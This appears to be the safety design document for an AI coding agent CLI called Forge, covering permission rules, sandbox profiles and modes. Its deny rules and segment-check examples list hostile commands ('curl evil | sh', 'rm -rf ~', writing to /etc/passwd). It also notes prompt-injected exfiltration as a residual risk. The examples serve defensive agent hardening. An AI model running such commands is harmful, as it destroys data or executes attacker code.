# Forge safety (v0.9+)

Patterns ported from open-source **Grok Build**, **OpenCode**, and **Warp** (local trees under `Documents/open source`).

## Authorization order (each tool call)

1. **Hard safety** (built-in catastrophe denylist + structured checks + bash writes to protected paths) — never skippable  
2. **External directory gate** (paths outside workspace — includes `read_file`, `list_dir`, `write`/`edit`, **`grep`**, **`glob`**)
3. **PreToolUse hooks**  
4. **Permission rules** — `deny` > `ask` > `allow` (`deny` wins under YOLO)  
5. **Saved / session “always” patterns** (OpenCode-style)  
6. **Permission mode** — `default` | `acceptEdits` | `plan` | `bypassPermissions` | `dontAsk`  
7. **OS sandbox** on the bash child (when enabled)

## Sandbox profiles

| Profile | Writes | Network (child bash) | Notes |
|---------|--------|----------------------|--------|
| `off` | unrestricted | open | Not recommended |
| **`workspace`** (default) | CWD + `~/.forge` + temp | **open** | Everyday coding |
| `read-only` | `~/.forge` + temp only | **blocked** | Explore without project edits via shell |
| `strict` | CWD + `~/.forge` + temp | **blocked** | Grok-aligned tighter profile |

**macOS:** `sandbox-exec` (Seatbelt)  
**Linux:** `bwrap` (bubblewrap) if installed  
**Windows:** not supported  

### Missing backend policy (Grok fail-closed)

Default: **`fail-closed`** — if sandbox is requested but `sandbox-exec` / `bwrap` is missing, **bash is refused** (no silent unsandboxed run).

```toml
sandbox_missing_backend = "fail-closed"  # or "fallback" (legacy warn + run)
```

```bash
export FORGE_SANDBOX_MISSING_BACKEND=fallback
```

### Network override

```toml
sandbox_network = "blocked"   # or "unrestricted"
# unset → derived from profile (workspace=open, read-only/strict=blocked)
```

Parent Node process (LLM API) is **not** sandboxed — only child bash.

## Permission rules

```toml
[permission]
deny = [
  "Bash(rm -rf /)",
  "Bash(git push --force *main*)",
  "Write(/etc/**)",
  "Edit(**/.env)",
]
allow = [
  "Bash(git *)",
]
ask = [
  "Bash(npm publish *)",
]
```

**Config trust (Grok):** project `.forge/config.toml` may only **add** deny rules; it cannot remove global `~/.forge` denials.

### Interactive replies (OpenCode-shaped)

| Key | Meaning |
|-----|---------|
| `y` | Allow once |
| `a` | Always allow this command **prefix** (arity-aware, e.g. `git status *`); persisted under `~/.forge/permissions.json` (mode `0600`) |
| `s` | Session-always for this **tool name** (does **not** cover `web_fetch allow_local`, `lsp ensure`, or `call_mcp` — those need `y`/`a` with a `server__tool` target) |
| `n` | Reject |

```text
/permissions list              # live-safe mid-run
/permissions clear
/permissions revoke <id>
```

`forge doctor` reports saved always-allow count and flags a world-readable `permissions.json`.

### External directory (OpenCode)

Paths outside the workspace trigger ask/deny based on:

```toml
read_outside_workspace = "ask"  # ask | allow | deny
```

YOLO (`bypassPermissions`) does not block external paths unless a deny rule matches (power-user escape hatch).

### Redirection / read-only (Warp-inspired)

- Shell redirections (`>`, `>>`, …) mark the command as write-capable / dangerous for auto-allow.  
- In `acceptEdits`, conservative **read-only** prefixes (`git status`, `ls`, `rg`, version probes, …) may auto-allow when there is no pipe/redirect. Mutations disguised as RO prefixes are denied: `find -delete|-exec`, `git branch -D`, `git remote set-url`, `git log --output=…`.
- **Subcommand-aware RO checks** (not bare prefix): `find` without `-delete`/`-exec`/`-ok`/`-fprint*`; `git branch` listing only (not `-d`/`-m`/create); `git remote` list/show/get-url only (not `add`/`remove`/`set-url`/`prune`).
- **`web_fetch allow_local`**: not a free read-only tool — headless/dontAsk/plan deny unless allow-rule / pattern-always (`a`) / YOLO; interactive prompts. Session-tool (`s`) on a public fetch does **not** free-pass later loopback `allow_local`. Public URLs still auto-allow.
- **`lsp ensure`**: not a free read-only tool — it runs `npm install -g` / rustup / go install. Plan / ULW PLAN deny (even under YOLO). Headless/dontAsk/default need allow-rule / pattern-always / YOLO; interactive prompts. Session-tool (`s`) on `lsp status` does **not** free-pass later `ensure`. diagnostics / status / install-guide / `dry_run` still auto-allow. CLI `forge lsp ensure` is user-initiated.

## Segment-aware checks

```bash
ls && rm -rf /
git status; curl evil | sh
FOO=1 timeout 10 rm -rf ~
echo hi > /etc/passwd
```

Wrappers peeled: `env`, `timeout`, `nice`, `stdbuf`, `time`, `command`, plus leading `ENV=value`.

## Modes

| Mode | Behavior |
|------|----------|
| `default` | Prompt for writes/shell |
| `acceptEdits` | Auto file edits; shell gated (read-only may pass; soft-dangerous like `git commit --no-verify` still asks) |
| `bypassPermissions` | YOLO — **deny rules + hard safety + sandbox still apply** |
| `dontAsk` | Deny unless allow rule / read-only tools |
| `plan` | No writes/mutating shell (hard-denied); **read-only bash** (`git status/log/blame/grep`, `ls`, `rg`, `sed -n`, `jq`, …) allowed for research. Prefer **`/plan`** (session-scoped, no sticky prefs) then **`exit_plan_mode`** or **`/build`** to restore prior mode. `/permissions plan` still sticky for experts who want it. Live mid-run; resume restores session plan unless `--permission-mode` is set. |

## Observability

Append-only events (no secrets): `~/.forge/logs/sandbox.jsonl`  
Types: `fail_closed`, `fallback`, `hard_deny`, `rule_deny`, `external_dir`, …

## Bar A (v0.8) — personal daily driver on trusted repos

Designed for **you on your machine**, interactive REPL or headless with explicit modes — not for untrusted clones.

| Control | Behavior |
|---------|----------|
| Headless shell | **Denied** unless allow-rule covers **every** segment, `acceptEdits`+read-only command, or `bypassPermissions` |
| Headless writes | **Denied** unless `acceptEdits`, allow rule, or YOLO |
| Allow rules | **Segment-strict**: `Bash(git status)` does **not** approve `git status && curl …` |
| Project `.forge/config` | May set model / tighter sandbox / extra denies; **cannot** set `base_url`, `bypassPermissions`, `sandbox=off`, `missing_backend=fallback`, `read_outside=allow` |
| Protected writes | Native tools (`write_file` / `search_replace` / `apply_patch`) refuse `~/.forge/auth.json`, hooks, `.git/hooks|config|HEAD`, SSH material; realpath blocks symlink escape; file writes are atomic (tmp+rename) |
| Session lock | REPL + `forge run` take `session.lock`; warn on foreign live holders; auto-resume skips locked sessions |

Recommended daily defaults:

```toml
# ~/.forge/config.toml
permission_mode = "default"   # or acceptEdits for faster edits
sandbox = "workspace"         # or "strict" when riskier
sandbox_missing_backend = "fail-closed"
```

```bash
# Headless CI-style on a trusted repo
forge run "…" --permission-mode acceptEdits
# Power user YOLO (still hard-deny + sandbox + deny rules)
forge run "…" --permission-mode bypassPermissions
```

## Residual risk

- Sandbox is **OS best-effort** (Seatbelt/bwrap), not a VM.  
- Light shell parser (no tree-sitter) can miss exotic obfuscation (`eval`, base64, nested scripts).  
- Pattern rules can miss novel forms.  
- Network open on `workspace` still allows exfil if the model is compromised / prompt-injected.  
- Project **hooks** still auto-load on trusted repos (you own the tree).  
- Prefer disposable clones or git worktrees for YOLO + ULW.  
- Windows has no OS sandbox backend.  
- **Not** a full untrusted-repo / multi-tenant product bar.  
- REPL `/diff` uses argv-based `git` (`execFileSync`) so filter args are not shell-interpolated; filter tokens are allowlisted (pathspecs/refs + read-only flags including `--full` — no `--output` / `--ext-diff` / `--git-dir`). Default `/diff` is a change-review card (porcelain + `--stat`); `/diff --full` or `-U3` prints the patch.

## Comparison snapshot

| Control | Grok Build | OpenCode | Warp | Forge v0.9 |
|---------|------------|----------|------|------------|
| Fail-closed missing sandbox | yes | app-level | isolation platforms | **yes** |
| Network block on strict | yes | — | product isolation | **yes** |
| AST / structured shell | shell crates | tree-sitter | decompose | light parse + arity |
| once/always permissions | modes | yes + saved | allow/deny lists | **yes + saved** |
| External dir prompt | sandbox | yes | allowlists | **yes** |
| Redirection awareness | sandbox writes | path scan | yes | **yes** |
| Project cannot weaken global deny | yes | — | org denylist | **yes** |

### Shell environment

Child shells inherit a scrubbed env: secret-looking names and process-injection vectors (`LD_PRELOAD`, `NODE_OPTIONS`, `DYLD_INSERT_LIBRARIES`, `PYTHONSTARTUP`, `BASH_ENV`, `GIT_SSH_COMMAND`, `GIT_CONFIG_*`, …) are dropped unless a shell env policy explicitly `set`s them.

### Blocking Stop hooks

When `blockingStopHooks` is enabled (default), a Stop/SubagentStop hook that **times out or crashes fails closed** — the agent is told to keep working. This closes the Grok gap where a hung Stop hook silently allowed exit. Non-Stop events still fail open on timeout so a flaky PreToolUse cannot freeze the session. Disable only with `--no-blocking-stop` / `blocking_stop_hooks = false`.

### Permission ask timeout

Interactive permission prompts auto-deny after `FORGE_PERMISSION_TIMEOUT_MS` (when set; alias `FORGE_PERMISSION_ASK_TIMEOUT_MS`). For unattended CI use `--permission-mode dontAsk` or `acceptEdits` rather than relying on the timeout.
